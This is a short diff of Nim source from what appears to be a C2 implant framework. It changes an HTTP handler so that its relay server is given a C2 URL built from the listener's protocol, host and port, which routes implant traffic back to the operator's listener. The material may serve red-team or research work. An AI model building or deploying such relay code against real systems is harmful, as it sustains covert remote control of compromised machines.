@@ -1480,8 +1480,13 @@ proc httpHandler() {.async.} =
                             echo "[RELAY] 🚀 Starting HTTP relay server on runtime port: " & $port
                             echo "[RELAY] 🆔 Using implant GUID: " & listener.id
                         
+                        # Build C2 URL from listener config
+                        let c2Url = toLowerAscii(listener.listenerType) & "://" & listener.listenerHost & ":" & listener.listenerPort
+                        when defined debug:
+                            echo "[RELAY] 🎯 C2 URL: " & c2Url
+                        
                         # Start relay server in background (non-blocking)
-                        let started = relay_launcher.startRelayServerWithPort(port, listener.id)
+                        let started = relay_launcher.startRelayServerWithPort(port, listener.id, c2Url)
                         
                         # Send response immediately (don't wait for server loop)
                         if started:
